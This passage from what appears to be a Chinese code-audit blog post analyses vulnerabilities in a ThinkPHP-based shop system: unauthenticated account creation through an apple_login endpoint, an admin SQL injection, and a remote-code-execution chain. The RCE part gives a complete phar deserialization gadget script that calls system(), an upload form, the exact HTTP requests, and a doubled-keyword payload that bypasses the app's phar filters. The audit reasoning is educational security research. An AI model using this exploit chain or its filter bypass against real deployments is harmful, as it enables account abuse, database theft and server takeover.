![image.png](../../images/posts/2dfbf90047b6b9a9fb03d5992c7224a1.png)
使用 Token 即可登录账户。例如查看用户身份信息：
![image.png](../../images/posts/ea70d7ff2870fb51cc3ef81d26bfb528.png)
### 漏洞审计
利用链路：
```
api/controller/v1/LoginController.php appleLogin 444行
  	services/wechat/WechatServices.php appAuth 372行
      	services/wechat/WechatUserServices.php wechatOauthAfter 272行
          	services/user/UserServices.php setUserInfo 122行
```
`appleLogin`函数位于`api/controller/v1/LoginController.php`第444行。从POST请求中获取4个参数，其中`phone`和`captcha`是同时使用的，允许为空。`$email`为空会自动生成，所以我们只需要传递`openId`即可。
`openId`也可以为空，但为了随机生成新用户，需要保证`openId`的随机性。
![image.png](../../images/posts/59c625f38ce0aae964997ed194c200ff.png)
往下进入到`appAuth`函数，位于`services/wechat/WechatServices.php`第372行。这里补全了用户信息。
![image.png](../../images/posts/57e51af2dd2a32a8184fdbcaac59e822.png)
其中存在一个手机绑定校验，前提是开启`store_user_mobile`。这里默认值为`0`，也就无需校验手机号和验证码了。
![image.png](../../images/posts/cae7b5c71ed7d80ee21dbf3d9d31a243.png)
412行进入`wechatOauthAfter`函数，位于`services/wechat/WechatUserServices.php`第272行。
![image.png](../../images/posts/158cabc9e0c9c0b0be4643561d35d8be.png)
这里从数据库查询了`eb_wechat_user`和`eb_user`，确保两张表都没有记录就会创建新用户。
![image.png](../../images/posts/f7387319b06f01c72246d548c947225a.png)
357行进入`setUserInfo`函数，位于`services/user/UserServices.php`第122行。用于添加用户数据。
![image.png](../../images/posts/f63e8d699fd8eedcadd097e72a7e604c.png)
## 【中危】后台SQL注入（查看表接口详细功能） 
### 漏洞详情
在进行SQL查询时，没有使用预编译和过滤，而是使用字符串拼接的方式拼接SQL语句。在实现查看表接口详细功能时，拼接了未经校验的数据，导致SQL注入漏洞的产生。
### 漏洞复现
_注意服务名和端口，需要自行替换_。
访问后台：`http://localhost:45600/admin`
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`维护->开发工具->数据库管理`
`http://localhost:45600/admin/system/maintain/system_databackup/index`
![image.png](../../images/posts/ce29483909fb00b700a2b37b35d88c7c.png)
在右边找到详细按钮，点击后并抓包，原始数据包：
![image.png](../../images/posts/2bf682c02ce14018f214080df6381020.png)
修改`tablename`成`'`可以看到报错提示。
![image.png](../../images/posts/a17c3394376957659c285335fec9fa8d.png)
保存文件后使用sqlmap进行攻击：
![image.png](../../images/posts/73431874baa8cecdb15fdd1eba0cce02.png)
```
GET /adminapi/system/backup/read?tablename=' HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/system/maintain/system_databackup/index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```
### 漏洞审计
在`services/system/SystemDatabackupServices.php`第68行，使用了query执行sql语句，其中`$tablename`作为字符串进行拼接，没有进行预编译或者过滤。![image.png](../../images/posts/b90fcf0619099e7346add2512e0231a6.png)
向上寻找到`read`函数，位于`adminapi/controller/v1/system/SystemDatabackup.php`第51行，这里通过POST获取了`tablename`，虽然使用了`htmlspecialchars` ，但这个函数不过滤单引号。
![image.png](../../images/posts/28b8273ed9c83964fa03cdf4d2b56271.png)
## 【高危】前台RCE（获取图片base64功能） 
### 漏洞详情
攻击者可以创建恶意的"phar"文件，其中包含恶意序列化的对象或代码。当应用程序使用"readfile"函数读取这个恶意的"phar"文件时，PHP会尝试反序列化该文件中的内容，从而触发反序列化漏洞。在实现获取图片base64功能时，没有对用户输入的内容进行严格校验导致漏洞的产生。
### 漏洞复现

1. **制作EXP**

制作一个可以利用带有反序列化链的Phar文件。
[https://www.anquanke.com/post/id/257485#h3-7](https://www.anquanke.com/post/id/257485#h3-7)
```
<?php
namespace think;
abstract class Model{
    use model\concern\Attribute;
    use model\concern\ModelEvent;
    protected $table;
    private $force;
    private $exists;
    private $lazySave;
    private $data = [];
    function __construct($obj){
        $this->table = $obj;
        $this->force = true;
        $this->exists = true;
        $this->lazySave = true;
        $this->data = ["test" => "calc.exe"];
    }
}

namespace think\model\concern;
trait ModelEvent{
    protected $withEvent = true;
    protected $visible = ["test" => "1"];
}
trait Attribute{
    private $withAttr = ["test" => "system"];
}

namespace think\model;
use Phar;
use think\Model;
class Pivot extends Model{
    function __construct($obj = ''){
        parent::__construct($obj);
    }
}

$exp = new Pivot(new Pivot());
$phar = new Phar('tp6x_exp.phar');
$phar->startBuffering();
$phar->addFromString('test.jpg','test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($exp);
$phar->stopBuffering();
echo base64_encode(serialize($exp));
?>
```
将文件放到 public 目录下运行后，会生成`tp6x_exp.phar`文件，将他重命名为`tp6x_exp.gif`。

2. **制作上传页面**

制作命名为`index.html`的文件，内容为：
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>文件上传表单</title>
</head>
<body>

<h1>文件上传</h1>

<form action="http://localhost:45600/api/upload/image" method="post" enctype="multipart/form-data">
    <label for="file">选择要上传的文件:</label>
    <input type="file" name="file" id="file">
    <br><br>
    <input type="submit" value="上传文件">
</form>

</body>
</html>

```
_注意：需要替换_`_localhost:45600_`_里面的IP和端口为实际运行的。_
通过`python -m http.server 12390`启动HTTP服务，也可以通过`php -S localhost:12390`到达一样的效果。访问后可以看到上传页面。
![image.png](../../images/posts/7416f572ea93f4de4e97a692ccf4a699.png)

3. **获得普通用户Token**

通过任意用户注册获取到普通用户的Token来请求图片上传接口。
对`http://localhost:45600/api/apple_login`发起请求，修改`openId`为随机数值。
```
POST /api/apple_login HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 28

{"openId":"asdasdasdqweqwe"}
```
发送请求包后即可获得Token。
![image.png](../../images/posts/2dfbf90047b6b9a9fb03d5992c7224a1.png)

4. **上传恶意文件**

选择我们要上传的恶意文件，然后点击上传，此时进行抓包。
![image.png](../../images/posts/0c8b70a319aa9e70a7a2a6ec80ed07d3.png)
添加请求头，并使用通过第三步获取到的token替换掉`<token>`：
```
Authori-zation: Bearer <token>
```
![image.png](../../images/posts/260171e07e6eb5e6538f1d26afeccd3f.png)
放行后可以看到文件成功上传。
![image.png](../../images/posts/f63741f555acc358376189418e1ff5de.png)
观察文件路径，`/uploads/store/comment/20230916/f78621efaf95689076f55ada575d32d2.gif`

5. **触发Phar进行反序列化**

构造phar请求，路径为我们上传文件后的恶意文件路径。
```
POST /api/image_base64 HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 222

{
"image": "phapharrphapharr://://./uploads/store/comment/20230916/f78621efaf95689076f55ada575d32d2.gif/test.jpg",
"code": "phapharrphapharr://://./uploads/store/comment/20230916/f78621efaf95689076f55ada575d32d2.gif/test.jpg"
}
```
![image.png](../../images/posts/7586cbc9035dfe55c912c50b9cd06aa0.png)
> readfile 函数在 PHP 中用于读取文件并将其内容输出到浏览器。当你使用相对路径作为参数传递给 readfile 函数时，**相对路径是相对于当前执行 PHP 脚本的路径**。
> 入口文件 index.php 再 public 目录下，Phar协议相对的就是这个路径。

### 漏洞审计
造成Phar文件解析的函数`readfile`，位于`common.php`第569行。
![image.png](../../images/posts/083976fdbbef960c43d820b4a1b97fb4.png)
当恶意请求经过重重过滤后，最终的`$url`是完整的`phar`协议，路径为我们上传的恶意文件。
![image.png](../../images/posts/8c73e7982457486836ef9858ba1bdf45.png)
`put_image`函数在`get_image_base64`中调用，位于`api/controller/v1/PublicController.php`第318行。
![image.png](../../images/posts/ed8554d1dd48b056764bfdbb2b5e23c3.png)
从 postMore 传参开始寻找构造条件。

1. **请求体参数正则过滤**`**phar**`
```
[$imageUrl, $codeUrl] = $request->postMore([
    ['image', ''],
    ['code', ''],
], true);
```
参数获取的函数调用路径为：`postMore`->`more`
![image.png](../../images/posts/b4e8b1f0c9cfef1a8d50397be8ffd325.png)
观察`Request.php`文件中的`filterWord`，这里通过`preg_replace`将指定过滤的数据全部转成了空。
默认情况下，preg_replace 函数只会替换一次匹配的内容。如果你想替换所有匹配到的内容，你可以在调用 preg_replace 函数时传递第四个参数 $limit，将其设置为 -1，表示替换所有匹配。
函数原型：
```
preg_replace($pattern, $replacement, $subject, $limit, &$count);
```
参数说明：

- $pattern：正则表达式模式，用于搜索匹配的内容。
- $replacement：替换找到的匹配内容时要使用的内容。
- $subject：要搜索和替换的字符串。
- $limit：可选参数，指定最多替换的次数。默认为 -1，表示替换所有匹配。
- &$count：可选参数，用于存储替换的次数。

![image.png](../../images/posts/68245c334f23fa501b26bd306fc960c7.png)
这里的`/phar/is`正则：

- / 是正则表达式的分隔符。
- phar 是要匹配的字符串。
- i 是正则表达式模式修饰符，表示不区分大小写进行匹配。
- s 是正则表达式模式修饰符，表示. 可以匹配换行符。

因为只匹配一次，这里可以通过双重写法绕过：`phapharr`->`phar`

2. **绕过两个判断条件**

回到`get_image_base64`，观察两个判断条件：
```
if ($imageUrl !== '' && !preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $imageUrl) && strpos($imageUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
if ($codeUrl !== '' && !(preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $codeUrl) || strpos($codeUrl, 'https://mp.weixin.qq.com/cgi-bin/showqrcode') !== false) && strpos($codeUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
```

1. 对 $imageUrl 进行检查：
   - 检查 $imageUrl 是否不为空。
   - 检查 $imageUrl 是否不以 .png, .jpg, .jpeg, 或 .gif 结尾
   - 检查 $imageUrl 是否包含 "phar://"
2. 对 $codeUrl 进行检查：
   - 检查 $codeUrl 是否不为空。
   - 检查 $codeUrl 是否不以 .png, .jpg, .jpeg, 或 .gif 结尾，或者不是以 'https://mp.weixin.qq.com/cgi-bin/showqrcode' 开头
   - 检查 $imageUrl 是否包含 "phar://"

根据 Phar 的特性，可以使得后缀为他们指定任意白名单后缀，所以`!preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $imageUrl)`返回的是 false。运算符`&&`的**短路求值**（Short-circuit evaluation）特性：
如果第一个表达式为假（false），则不会执行第二个表达式，因为整个逻辑与表达式已经确定为假，所以不必再判断第二个表达式。
根据这个条件，当我们满足后缀是以 .png, .jpg, .jpeg, 或 .gif 结尾就不会触发`strpos($imageUrl, "phar://") !== false`判断。因此这里被绕过。

3. **进入**`**put_image**`**函数**

通过判断后，进入到以下代码中去。先通过`CacheService::remember`判断`$codeUrl`的值有没有缓存，如果没有缓存的话，进入到调用提供的匿名函数中去。
```
$code = CacheService::remember($codeUrl, function () use ($codeUrl) {
    $codeTmp = $code = $codeUrl ? image_to_base64($codeUrl) : false;
    if (!$codeTmp) {
        $putCodeUrl = put_image($codeUrl);
        $code = $putCodeUrl ? image_to_base64(app()->request->domain(true) . '/' . $putCodeUrl) : false;
        $code ?? unlink($_SERVER["DOCUMENT_ROOT"] . '/' . $putCodeUrl);
    }
    return $code;
});
```
匿名函数的逻辑是，

1. 先通过`image_to_base64`函数中的`curl_exec`去请求获取内容
2. "不行"的话再通过`put_image`函数中的`readfile`获取内容保存到服务器，将返回的路径赋值给 `$putCodeUrl`。
3. 再通过`image_to_base64`请求这个地址。

这里需要进入`put_image`，需要让`image_to_base64`函数返回 false。
观察`image_to_base64`函数，当`$code!=200`的时候就会返回 false 了。反过来看，满足`$code == 200`的只有 HTTP、FTP 请求，不属于这两种协议的请求都可以返回 false。
![image.png](../../images/posts/a981321c1409cd0ed378690a92500c48.png)

4. **绕过**`str_replace`**函数**

在进入`readfile`之前还有一个对路径后缀的判断：
```
$ext = pathinfo($url);
if ($ext['extension'] != "jpg" && $ext['extension'] != "png" && $ext['extension'] != "jpeg") {
    return false;
}
$filename = time() . "." . $ext['extension'];
```
根据Phar特性，完全可以满足。
再观察`str_replace`函数特性如下：

1. 替换字符串：str_replace 会在目标字符串中查找指定的字符串或字符，并将其替换为另一个字符串或字符。
2. 区分大小写：默认情况下，str_replace 区分大小写，即**只会替换与指定字符串完全匹配的部分**。
3. 替换多次出现的内容：str_replace 可以替换目标字符串中的所有匹配项，而不仅仅是第一个。

根据特性，这里可以通过双重写法绕过。`pharphar://://`->`phar://`
```
$url = str_replace('phar://', '', $url);
```
![image.png](../../images/posts/083976fdbbef960c43d820b4a1b97fb4.png)
payload 解析路径为：`phapharrphapharr://://`->`pharphar://://`->`phar://`
[![漏洞复现.mp4 (21.02MB)](../../images/posts/7f2f55e32159afeaa752aaa4983cc03b.png)]()# 0x05 总结
PHP的代码审计相对来说比较透明，关注一些危险函数即可。比较考验开发人员的安全意识和安全开发的水平能力。在实际进行代码审计时，我们需要搭建环境，结合数据库日志、代码审计工具、抓包工具进行检测。除了传统的危险函数检索，还可以从用户权限能力、业务绕过、凭据与加密方向进行考虑与审计。PHP 在CTF中的题目占较大，有非常多不错的题目，我们可以借鉴一二进行学习。
